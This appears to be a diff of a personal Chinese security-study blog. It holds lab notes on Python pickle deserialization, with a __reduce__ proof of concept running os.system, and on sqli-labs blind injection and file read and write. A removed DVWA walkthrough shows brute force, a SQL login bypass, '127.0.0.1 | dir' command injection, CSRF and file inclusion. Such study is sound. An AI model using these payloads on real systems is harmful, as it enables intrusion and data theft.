+<h4 id="举例"><a href="#举例" class="headerlink" title="举例"></a>举例</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import pickle</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">People</span>(<span class="title">object</span>):</span></span><br><span class="line"><span class="class">    <span class="title">def</span> <span class="title">__init__</span>(<span class="title">self</span>, <span class="title">name</span>=&quot;<span class="title">test</span>&quot;):</span></span><br><span class="line"><span class="class">        <span class="title">self</span>.<span class="title">name</span> = <span class="title">name</span></span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">    <span class="title">def</span> <span class="title">say</span>(<span class="title">self</span>):</span></span><br><span class="line"><span class="class">        <span class="title">print</span>(&quot;<span class="title">Hello</span> ! <span class="title">My</span> <span class="title">friends</span>&quot;)</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="title">a</span> = <span class="title">People</span>()</span></span><br><span class="line"><span class="class"><span class="title">c</span> = <span class="title">pickle</span>.<span class="title">dumps</span>(<span class="title">a</span>)</span></span><br><span class="line"><span class="class"><span class="title">print</span>(<span class="title">c</span>)</span></span><br></pre></td></tr></table></figure>
+
+<p>out: 很多不可见字符</p>
+<p>​<code>b&#39;\x80\x04\x95,\x00\x00\x00\x00\x00\x00\x00\x8c\x08__main__\x94\x8c\x06People\x94\x93\x94)\x81\x94&#125;\x94\x8c\x04name\x94\x8c\x04test\x94sb.&#39;</code>​</p>
+<p>生成的规则涉及到PVM：用来解释字节码的解释引擎</p>
+<p>‍</p>
+<h3 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h3><p>​<code>pickle.load(file)</code>​</p>
+<p>如果加s dumps 返回字符串 否则是到文件中</p>
+<p>反序列化对象。将文件中的数据解析为一个python对象；</p>
+<p>需要注意：使用时需要让python能够找到类的定义 否则会报错</p>
+<p>‍</p>
+<h3 id="组成"><a href="#组成" class="headerlink" title="组成"></a>组成</h3><p>Pickle是一门基于栈的编程语言，有不同的编写方式，本质是一个轻量级的PVM（在Java中等同于JVM，用于解释字节码的解释引擎）</p>
+<p>有三个部分组成：</p>
+<ol>
+<li><strong>指令处理器（Instruction processor）</strong></li>
+</ol>
+<p>从数据流读取操作码和参数，对其进行解释处理 指令处理器会循环执行整个过程，不断改变stack(堆栈)和memo(备忘录)区域的值 直到遇到‘ <strong>.</strong> ‘这个结束符号。这时，最终停留在栈顶的值将会被作为反序列化对象返回。</p>
+<ol start="2">
+<li><strong>栈区（stack）</strong></li>
+</ol>
+<p>由python的列表list实现，作为流数据处理过程中的暂存区，在不断的进出栈过程中完成对数据流的反序列化操作，并最终在栈顶生成反序列化的结果。</p>
+<ol start="3">
+<li><strong>内存区（memo）</strong></li>
+</ol>
+<p>由python的字典dict实现，可以看作是数据索引或者标记，为PVM的整个生命周期提供存储功能，即将反序列化完成的数据以key-value的形式储存在memo中以便使用。</p>
+<p>在第一部分中的IP常用操作码：</p>
+<ul>
+<li><p><strong>c</strong>：读取本行的内容作为模块名module，读取下一行内容作为对象名object，然后将module.object作为可调用对象压入栈中</p>
+</li>
+<li><p><strong>(</strong> ：将标记对象（mark）压入栈中，用于确定命令执行的位置，搭配t指令一起使用以便产生一个元组</p>
+</li>
+<li><p><strong>S</strong>: 后跟字符串在引号内 直到出现换行符 PVM将读取的内容压入栈中</p>
+</li>
+<li><p><strong>t</strong> : 从栈中向外弹出数据，弹射顺序从栈顶一点点出到元组依次后排 直到弹出左括号 此时弹出内容形成一个元组 然后再压入栈中</p>
+</li>
+<li><p><strong>R</strong> : 将之前压入栈中的元组（t）和可调用对象（c）全部弹出，然后将该元组作为可调用参数的对象并执行该对象。最终将结果压入到栈中。</p>
+</li>
+<li><p><strong>.</strong>  : 结束整个Pickle反序列化过程</p>
+</li>
+</ul>
+<p><img src="/.com//1747658503023977923255372684818-20250519204144-7ybitsg.png" alt="1747658503023977923255372684818"></p>
+<p><img src="/.com//17476585059844407908704057067474-20250519204146-hby8s9y.png" alt="17476585059844407908704057067474"></p>
+<p><strong>漏洞利用</strong>：利用<code>__reduce__()</code>​</p>
+<p><strong>漏洞利用</strong>：利用<code>__reduce__()</code>​</p>
+<p><img src="/.com//17476585130011225927306100130946-20250519204153-53pqeav.png" alt="17476585130011225927306100130946"></p>
+<p><img src="/.com//17476585152762147770201117664215-20250519204156-hmuqk2h.png" alt="17476585152762147770201117664215"></p>
+<p>实际代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">import pickle</span><br><span class="line">import os</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span>(<span class="title">object</span>):</span></span><br><span class="line"><span class="class">    <span class="title">def</span> <span class="title">__reduce__</span>(<span class="title">self</span>):</span></span><br><span class="line"><span class="class">        <span class="title">a</span> = &#x27;<span class="title">whoami</span>&#x27;</span></span><br><span class="line"><span class="class">        <span class="title">return</span> (<span class="title">os</span>.<span class="title">system</span>, (<span class="title">a</span>,))</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="title">o</span> = <span class="title">A</span>()</span></span><br><span class="line"><span class="class">#序列化</span></span><br><span class="line"><span class="class"><span class="title">test</span> = <span class="title">pickle</span>.<span class="title">dumps</span>(<span class="title">o</span>)</span></span><br><span class="line"><span class="class">#反序列化</span></span><br><span class="line"><span class="class"><span class="title">pickle</span>.<span class="title">loads</span>(<span class="title">test</span>)</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">#本地运行结果即为电脑名称</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>做题步骤</strong></p>
+<ol>
+<li>找 pickle反序列化位点</li>
+<li>本地重写reduce方法，生成反序列化字符串</li>
+<li>触发反序列化</li>
+</ol>
+<p><strong>与php反序列化的区别</strong></p>
+<p>php中能做什么由网站里面的class类写得方法决定</p>
+<p>但是pickle只要存在反序列化的位点就可以任意执行，因为本地可以重写reduce方法</p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/%E6%96%87%E4%BB%B6%E7%B1%BB%E5%9E%8B%E7%BB%95%E8%BF%87/" data-id="cmaxy8gch003rkg7k81vs2hlo" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-Web/注入漏洞/SQL注入/sql注入靶场/sql——labs" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E9%9D%B6%E5%9C%BA/sql%E2%80%94%E2%80%94labs/" class="article-date">
-  <time class="dt-published" datetime="2025-05-20T00:55:56.000Z" itemprop="datePublished">2025-05-20</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h1 id="sql——labs"><a href="#sql——labs" class="headerlink" title="sql——labs"></a>sql——labs</h1><h1 id="Less—1"><a href="#Less—1" class="headerlink" title="Less—1"></a>Less—1</h1><p>字符型包裹为 ‘’</p>
-<h1 id="Less—2"><a href="#Less—2" class="headerlink" title="Less—2"></a>Less—2</h1><p>数字型无包裹</p>
-<h1 id="Less—3"><a href="#Less—3" class="headerlink" title="Less—3"></a>Less—3</h1><p>字符括号包裹（’’）</p>
-<h1 id="Less—4"><a href="#Less—4" class="headerlink" title="Less—4"></a>Less—4</h1><p>字符双引号括号包裹（””）</p>
-<h1 id="Less—5"><a href="#Less—5" class="headerlink" title="Less—5"></a>Less—5</h1><p>布尔盲注</p>
-<blockquote>
-<p><strong>1.left函数：</strong> select left(database(),1)&#x3D;’s’;  left(a,b)从左侧截取a的前b位，正确则返回，错误返回</p>
-<p><strong>2.regexp函数：</strong> select user() regexp ‘r’;   user()的结果是root，regexp为匹配root的正则表达式</p>
-<p><strong>3.like函数：</strong> select user() like ‘ro%’;	 匹配与regexp相似</p>
-<p><strong>4.substr(a,b,c):</strong>  select substr() XXXX;     substr(a,b,c)从位置b开始，截取a字符串c位长度  select substr((select database()),1,1)&#x3D;’s’;</p>
-<p><strong>5.ascii:</strong></p>
-<p><strong>6.chr(‘数字’)  ord(‘字母’)</strong>  			   python中转换ascii值</p>
-</blockquote>
-<p>‍</p>
-<h1 id="Less——7"><a href="#Less——7" class="headerlink" title="Less——7"></a>Less——7</h1><blockquote>
-<p>补充知识点</p>
-<p>​<code>show variables like &#39;%secure%&#39;;</code>​查看secure-file-priv当前的值，如果显示为NULL，则需要打开，：\phpstudy\PHPTutorial\MySQL\my.ini文件，在其中加上一句：secure file priv&#x3D;”&#x2F;”。</p>
-<p>而且要先设置secure_file_priv&#x3D;,如果它为空则可以指定任意目录，如果设置等于某个路径就只能在这个指定路径下，而它为NULL则禁止导入导出功能</p>
-<p>​<code>load_file()</code>​读取本地文件<code>select load_file(&#39;D:\\ctf_all\\phpstudy_pro\\WWW\\sqli-labs\\Less-7&#39;)</code>​</p>
-<p>​<code>into outfile</code>​写文件    用法：<code>select &#39;mysql is very good&#39; into outfile &#39;test1.txt&#39;;</code>​</p>
-<pre><code>				文件位置： 是在sql版本下的data文件中
-</code></pre>
-<p>我们要写到绝对位置那就，双反斜线是因为\t这种类型被转义掉了</p>
-<p>​<code>select &#39;a&#39; into outfile &#39;D:\\ctf_all\\phpstudy_pro\\WWW\\sqli-labs\\Less-7\\tsxt.txt&#39;；</code>​</p>
-<p><span data-type="text" style="background-color: var(--b3-card-error-background); color: var(--b3-card-error-color);">！！！注意sql语句中\需要转译</span></p>
-</blockquote>
-<p>‍</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E9%9D%B6%E5%9C%BA/sql%E2%80%94%E2%80%94labs/" data-id="cmaxy8gcj003ykg7kh2ykgbem" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%AF%A6%E8%A7%A3/" data-id="cmaxygi1e003ioc7k54sg99zk" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -253,7 +336,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/union%20%E6%B3%A8%E5%85%A5/" data-id="cmaxy8gcn004ckg7kefah5kb2" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/union%20%E6%B3%A8%E5%85%A5/" data-id="cmaxygi1h003yoc7k7q9yas8u" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -288,7 +371,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/" data-id="cmaxy8gcw0052kg7k1g1s1wdw" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/" data-id="cmaxygi1k004coc7k29jw1z26" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -300,10 +383,10 @@
 
 
   
-    <article id="post-Web/DVWA靶场通关" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+    <article id="post-Web/注入漏洞/SQL注入/sql注入靶场/sql——labs" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
-    <a href="/2025/05/20/Web/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/" class="article-date">
-  <time class="dt-published" datetime="2025-05-20T00:55:54.000Z" itemprop="datePublished">2025-05-20</time>
+    <a href="/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E9%9D%B6%E5%9C%BA/sql%E2%80%94%E2%80%94labs/" class="article-date">
+  <time class="dt-published" datetime="2025-05-20T00:55:56.000Z" itemprop="datePublished">2025-05-20</time>
 </a>
     
   </div>
@@ -312,366 +395,38 @@
     
     <div class="e-content article-entry" itemprop="articleBody">
       
-        <h1 id="DVWA靶场通关"><a href="#DVWA靶场通关" class="headerlink" title="DVWA靶场通关"></a>DVWA靶场通关</h1><h2 id="1-暴力破解-brute-force"><a href="#1-暴力破解-brute-force" class="headerlink" title="1.暴力破解 brute force"></a>1.暴力破解 brute force</h2><h3 id="low"><a href="#low" class="headerlink" title="low"></a>low</h3><blockquote>
-<p>使用bp抓包，分别在username和password处添加变量，使用集束炸弹（cluster bomb）模式，添加字典进行爆破</p>
-</blockquote>
-<p><img src="/.com//0c1252a336f1a19d4a0c461a2625dfbd-20250425163154-kusite3.png" alt="0c1252a336f1a19d4a0c461a2625dfbd"></p>
-<p><img src="/.com//6a77d729ad1c18c986d038672540d012-20250425164624-cuo7973.png" alt="6a77d729ad1c18c986d038672540d012"></p>
-<p>可以手工SQL注入（万能密码），在用户名框中输入admin’ or ‘1’=‘1，任意输入密码即可登陆（同时在弱口令字典里也有该语句）</p>
-<h3 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h3><p> 和low相比，过滤了一些转义字符，但依旧可以使用bp爆破方法同low</p>
-<p><img src="/.com//b25d2a1090203c32d0788cdd25e2dcdc-20250425164628-ohxr4rn.png" alt="b25d2a1090203c32d0788cdd25e2dcdc"></p>
-<h3 id="High"><a href="#High" class="headerlink" title="High"></a>High</h3><p> 随意输入用户名密码，抓个包可以看到，携带了token</p>
-<p><img src="/.com//b25d2a1090203c32d0788cdd25e2dcdc-20250425164628-ohxr4rn.png" alt="b25d2a1090203c32d0788cdd25e2dcdc-1"></p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">GET /vulnerabilities/brute/?username=123&amp;password=123&amp;Login=Login&amp;user_token=bd32cb5998988f7c2f041f82f0dd701c HTTP/1.1</span><br><span class="line">Host: 69044566-74ca-4a40-bab8-8275aae0037d.node5.buuoj.cn:81</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:137.0) Gecko/20100101 Firefox/137.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://69044566-74ca-4a40-bab8-8275aae0037d.node5.buuoj.cn:81/vulnerabilities/brute/</span><br><span class="line">Cookie: PHPSESSID=76shf76ao4uqleikshlanj6eh0; security=high</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Priority: u=0, i</span><br></pre></td></tr></table></figure>
-
+        <h1 id="sql——labs"><a href="#sql——labs" class="headerlink" title="sql——labs"></a>sql——labs</h1><h1 id="Less—1"><a href="#Less—1" class="headerlink" title="Less—1"></a>Less—1</h1><p>字符型包裹为 ‘’</p>
+<h1 id="Less—2"><a href="#Less—2" class="headerlink" title="Less—2"></a>Less—2</h1><p>数字型无包裹</p>
+<h1 id="Less—3"><a href="#Less—3" class="headerlink" title="Less—3"></a>Less—3</h1><p>字符括号包裹（’’）</p>
+<h1 id="Less—4"><a href="#Less—4" class="headerlink" title="Less—4"></a>Less—4</h1><p>字符双引号括号包裹（””）</p>
+<h1 id="Less—5"><a href="#Less—5" class="headerlink" title="Less—5"></a>Less—5</h1><p>布尔盲注</p>
 <blockquote>
-<p>发送到Intruder，攻击类型选择交叉攻击Pitchfork，给password和token添加payload位置</p>
-</blockquote>
-<p><img src="/.com//image-20250425164433-gi0ryza.png" alt="image"></p>
-<p><img src="/.com//image-20250425164358-rpkpeox.png" alt="image"></p>
-<p>然后token选择递归提取，并且把初始可用的token代入</p>
-<p><img src="/.com//image-20250425164754-z5wbyc4.png" alt="image"></p>
-<p><img src="/.com//image-20250425164835-vvz11kl.png" alt="image"></p>
-<p>然后开始攻击即可</p>
-<p>‍</p>
-<h2 id="Command-Injection"><a href="#Command-Injection" class="headerlink" title="Command Injection"></a>Command Injection</h2><h3 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h3><p>网站提示我们输入ip地址</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if( isset( $_POST[ &#x27;Submit&#x27; ]  ) ) &#123;</span><br><span class="line">    // Get input</span><br><span class="line">    $target = $_REQUEST[ &#x27;ip&#x27; ];</span><br><span class="line"></span><br><span class="line">    // Determine OS and execute the ping command.</span><br><span class="line">    if( stristr( php_uname( &#x27;s&#x27; ), &#x27;Windows NT&#x27; ) ) &#123;</span><br><span class="line">        // Windows</span><br><span class="line">        $cmd = shell_exec( &#x27;ping  &#x27; . $target );//函数能执行系统命令</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        // *nix</span><br><span class="line">        $cmd = shell_exec( &#x27;ping  -c 4 &#x27; . $target );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Feedback for the end user</span><br><span class="line">    echo &quot;&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>这里我们要说一下命令连接符<br>&amp; ：前面一个命令无论是否执行，后面的命令都能执行，两个命令都执行<br>&amp;&amp;：前面一个命令执行成功后，才能执行后面一个命令，两个命令都执行<br>|：前面一个命令无论是否执行，后面的命令都能执行且只执行后面一个<br>||：前面一个命令不能正常执行后，才能执行后面一个命令</p>
-<p>我们使用“|”符号作为连接符让计算机做出除ping以外的操作实现命令注入<br>结果显示注入成功！<br>命令：127.0.0.1 | dir</p>
+<p><strong>1.left函数：</strong> select left(database(),1)&#x3D;’s’;  left(a,b)从左侧截取a的前b位，正确则返回，错误返回</p>
+<p><strong>2.regexp函数：</strong> select user() regexp ‘r’;   user()的结果是root，regexp为匹配root的正则表达式</p>
+<p><strong>3.like函数：</strong> select user() like ‘ro%’;	 匹配与regexp相似</p>
+<p><strong>4.substr(a,b,c):</strong>  select substr() XXXX;     substr(a,b,c)从位置b开始，截取a字符串c位长度  select substr((select database()),1,1)&#x3D;’s’;</p>
+<p><strong>5.ascii:</strong></p>
+<p><strong>6.chr(‘数字’)  ord(‘字母’)</strong>  			   python中转换ascii值</p>
 </blockquote>
 <p>‍</p>
-<h3 id="Medium-1"><a href="#Medium-1" class="headerlink" title="Medium"></a>Medium</h3><p> 直接分析源码看看和Low等级有什么区别<br> 源码分析：发现在Low等级源码的基础上添加了一个黑名单，把‘&amp;&amp;’字符和‘;’字符过滤掉了，但我们可以使用黑名单之外的命令连接符继续命令注入</p>
-<p><img src="/.com//9275c6eed4da2dc9b0c7c1e5e63d563c-20250425170542-d99goej.png" alt="9275c6eed4da2dc9b0c7c1e5e63d563c"></p>
-<p>‍</p>
-<h3 id="High-1"><a href="#High-1" class="headerlink" title="High"></a>High</h3><p> 源码分析：发现还是一样的套路，也是过滤字符但过滤得更多了。但仔细观察发现有一个过滤是’| ‘，注意这个过滤是加了空格的，说明这个过滤其实是没用的，只需要’|’后面直接加入参数，不保留空格，我们依然可以用这个命令连接符进行命令注入</p>
-<p><img src="/.com//a24bd3a257d4e129cca8019070a9b07d-20250425170620-rfpguy9.png" alt="a24bd3a257d4e129cca8019070a9b07d"></p>
-<p>‍</p>
-<h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><h3 id="Low-1"><a href="#Low-1" class="headerlink" title="Low"></a>Low</h3><p> 网站的本意是让我们在网站里更改密码</p>
-<p><img src="/.com//1939fdc85c82e1df86c9b1f916522081-20250425171126-xu4wwp5.png" alt="1939fdc85c82e1df86c9b1f916522081"></p>
-<blockquote>
-<p>但是能够主要到当我们更改密码成功后url栏的参数是这样的<br><a target="_blank" rel="noopener" href="http://127.0.0.1/dvwa/vulnerabilities/csrf/?password_new=123456&password_conf=123456&Change=Change#">http://127.0.0.1/dvwa/vulnerabilities/csrf/?password_new=123456&amp;password_conf=123456&amp;Change=Change#</a><br>可以分析出password_new是我输入的密码，password_conf是我确认的密码，说明我们在网站上输入的信息是会在url栏这里进行一个传输执行</p>
-</blockquote>
-<p><img src="/.com//830adffb3898c5c5488d85ee81e8e6a9-20250425171137-dr9bhdv.png" alt="830adffb3898c5c5488d85ee81e8e6a9"></p>
-<p>抓个包看看，发现url栏的信息和请求的信息是一致的</p>
-<p> <img src="/.com//de160531a83b91e4ff84d165b7a7c13a-20250425171147-iksxt52.png" alt="de160531a83b91e4ff84d165b7a7c13a"></p>
-<blockquote>
-<p>那是不是说明如果我能控制url栏里传入的参数，就能够不在网站内执行更改密码的操作呢？<br>更改url的参数：<br><a target="_blank" rel="noopener" href="http://127.0.0.1/dvwa/vulnerabilities/csrf/?password_new=456789&password_conf=456789&Change=Change#">http://127.0.0.1/dvwa/vulnerabilities/csrf/?password_new=456789&amp;password_conf=456789&amp;Change=Change#</a><br>只需要在原来的url基础上该新密码和确认密码的参数即可</p>
-<p>为了显示效果，我使当前页面是密码不匹配状态</p>
-</blockquote>
-<p><img src="/.com//c170717135b963832851ab18cdd7291e-20250425171200-nuulqr6.png" alt="c170717135b963832851ab18cdd7291e"></p>
-<p>在新标签内放入设置好的url，点击执行</p>
-<p><img src="/.com//5c64252299acea56a3b35687d997aeb0-20250425171207-xr9kfct.png" alt="5c64252299acea56a3b35687d997aeb0"></p>
-<p>页面跳转到了dvwa的更改密码界面，csrf攻击成功</p>
-<p><img src="/.com//2ada0b8e5e0e9bc04452aa3935526506-20250425171213-9w5xvbr.png" alt="2ada0b8e5e0e9bc04452aa3935526506"></p>
-<blockquote>
-<p>网站的本意是在网站内更改密码，而我通过控制url的传参就能使我能在网站之外执行更改密码的操作，那么当我知道一个网站有csrf漏洞后也可以通过构造url的方式让别人点击执行他意想之外的行为</p>
-<p>源码分析：源码中只对传入的密码和确认密码进行比较，两者一致则执行更改密码命令成功返回Password Change，不一致则返回Passwords did not match，没有任何过滤，所以能轻易执行csrf漏洞</p>
-</blockquote>
-<p><img src="/.com//f0c609415b16d644263608771e005b1a-20250425171252-o8j4acs.png" alt="f0c609415b16d644263608771e005b1a"></p>
-<p>‍</p>
-<h3 id="Medium-2"><a href="#Medium-2" class="headerlink" title="Medium"></a>Medium</h3><p> 源码分析：和Low等级比较发现，只有一处改变，即在传入密码和确认密码参数前先进行了一个&#x3D;&#x3D;if语句的判断&#x3D;&#x3D;，判断里面的内容主要是验证这个访问请求是否是从&#x3D;&#x3D;dwva网站&#x3D;&#x3D;本身发起的，若不是就不执行后面的操作</p>
-<p><img src="/.com//9dbaa6761aa3ad43ade255e9fe296b30-20250425171315-yfcd81j.png" alt="9dbaa6761aa3ad43ade255e9fe296b30"></p>
-<p>源码是通过referrer这个字段的参数进行判断的，通常情况下在增加referrer验证时就是网站本身当前页面的ip地址，我们通过抓包看看信息</p>
-<p>首先抓一个包，可以看到这里有referer</p>
-<p><img src="/.com//9cea6507c937a1c9f35fd8b63940524c-20250425171659-wyha15h.png" alt="9cea6507c937a1c9f35fd8b63940524c"></p>
-<p>复制刚才构造好的url，在新页面打开：<a target="_blank" rel="noopener" href="http://192.168.10.5/DVWA/vulnerabilities/csrf/?password_new=666666&password_conf=666666&Change=Change#" title="http:&#x2F;&#x2F;192.168.10.5&#x2F;DVWA&#x2F;vulnerabilities&#x2F;csrf&#x2F;?password_new&#x3D;666666&amp;password_conf&#x3D;666666&amp;Change&#x3D;Change#">http://192.168.10.5/DVWA/vulnerabilities/csrf/?password_new&#x3D;666666&amp;password_conf&#x3D;666666&amp;Change&#x3D;Change#</a></p>
-<p>抓包，发现没有referer</p>
-<p><img src="/.com//3d4b2706cc958a8f1394de205839b040-20250425171716-w1cnaaw.png" alt="3d4b2706cc958a8f1394de205839b040"></p>
-<p>我们自己在这里加一个referer，随意添加，包含本机就可以例如：127.0.0.1</p>
-<p><img src="/.com//ab872067c571ccab991bbebbbe9c311d-20250425171723-miwfpva.png" alt="ab872067c571ccab991bbebbbe9c311d"></p>
-<p>放包，发现已经成功修改</p>
-<p>‍</p>
-<h3 id="high"><a href="#high" class="headerlink" title="high"></a>high</h3><p> 可以看到，设置了token</p>
-<p> 这里我们采用抓包，把包发到重放模块，在row中可以看到新的token</p>
-<p><img src="/.com//4eb20c2a54b3919e475b47dfde22f4ff-20250425171734-p8nrrqi.png" alt="4eb20c2a54b3919e475b47dfde22f4ff"></p>
-<blockquote>
-<p>接下来使用获取到的新token构造链接</p>
-<p><a target="_blank" rel="noopener" href="http://192.168.10.5/DVWA/vulnerabilities/csrf/?password_new=666666&password_conf=666666&Change=Change&user_token=9c36edfc71b135e726adce6603be8651">http://192.168.10.5/DVWA/vulnerabilities/csrf/?password_new=666666&amp;password_conf=666666&amp;Change=Change&amp;user_token=9c36edfc71b135e726adce6603be8651</a></p>
-<p>修改成功</p>
-</blockquote>
-<p>‍</p>
-<h2 id="4-File-inclusion-文件包含"><a href="#4-File-inclusion-文件包含" class="headerlink" title="4.File inclusion 文件包含"></a>4.File inclusion 文件包含</h2><h3 id="low-1"><a href="#low-1" class="headerlink" title="low"></a>low</h3><p> 每次点击都会跳转，所以可以在page=后面添加本地文件路径</p>
-<p><img src="/.com//7386fd3fd2979574a11e49bbf188337a-20250425172020-tcersi4.png" alt="7386fd3fd2979574a11e49bbf188337a"></p>
-<h3 id="medium"><a href="#medium" class="headerlink" title="medium"></a>medium</h3><p> 可以通过ip+路径包含文件</p>
-<p><img src="/.com//d28bea7da6e424606062dfb78c2893e1-20250425172030-4kgs98a.png" alt="d28bea7da6e424606062dfb78c2893e1"></p>
-<h3 id="high-1"><a href="#high-1" class="headerlink" title="high"></a>high</h3><p><img src="/.com//ea03f7407dc9279a2ed7d860673023f0-20250425172036-kxf2wi3.png" alt="ea03f7407dc9279a2ed7d860673023f0"></p>
-<p>源码限制了page之后的参数是以file开头，所以可以用file函数去构建</p>
-<p> <a target="_blank" rel="noopener" href="http://192.168.10.5/DVWA/vulnerabilities/fi/?page=file://E:%5CphpStudy%5CWWW%5CDVWA%5Cfile555.txt" title="http:&#x2F;&#x2F;192.168.10.5&#x2F;DVWA&#x2F;vulnerabilities&#x2F;fi&#x2F;?page&#x3D;file:&#x2F;&#x2F;E:\phpStudy\WWW\DVWA\file555.txt">http://192.168.10.5/DVWA/vulnerabilities/fi/?page=file://E:\phpStudy\WWW\DVWA\file555.txt</a></p>
-<p><img src="/.com//b94534da3ee8d55a722bd51d644994e6-20250425172043-5fapvh7.png" alt="b94534da3ee8d55a722bd51d644994e6"></p>
-<p>‍</p>
